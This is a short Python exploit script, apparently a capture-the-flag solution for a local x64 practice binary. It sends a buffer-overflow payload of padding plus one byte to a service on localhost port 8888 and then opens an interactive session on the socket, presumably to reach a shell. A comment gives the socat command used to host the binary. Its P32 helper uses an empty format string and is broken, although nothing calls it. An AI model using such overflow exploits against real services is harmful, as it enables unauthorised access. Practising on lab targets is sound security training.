import socket
import telnetlib
import struct

def P32(val):
	return struct.pack("", val)

def pwn():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("127.0.0.1", 8888))
	payload = 'A'*0x8 + '\x10'
	s.sendall(payload + '\n')
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

if __name__ == "__main__":
    # socat tcp-l:8888,fork exec:./question_1_plus_x64,reuseaddr
	pwn()
